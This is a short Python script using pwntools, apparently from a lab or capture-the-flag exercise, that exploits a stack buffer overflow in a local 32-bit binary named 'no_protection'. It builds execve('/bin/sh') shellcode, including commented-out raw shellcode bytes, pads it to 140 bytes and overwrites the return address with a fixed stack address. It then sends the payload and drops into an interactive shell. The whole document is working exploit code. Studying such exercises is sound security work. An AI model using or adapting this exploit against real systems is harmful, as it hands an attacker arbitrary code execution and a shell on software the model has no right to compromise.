from pwn import *
ret = 0xffffcb40
sh = process('./no_protection')
# context(log_level='debug',arch='i386',os='linux')
shellcode = asm(shellcraft.sh())
# shellcode = b"\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73"
# shellcode += b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0"
# shellcode += b"\x0b\xcd\x80"
print(len(shellcode))
payload = shellcode + b'A' * (140-len(shellcode)) + p32(ret)
## 向程序发送字符串
sh.sendline(payload)
## 将代码交互转换为手工交互
sh.interactive()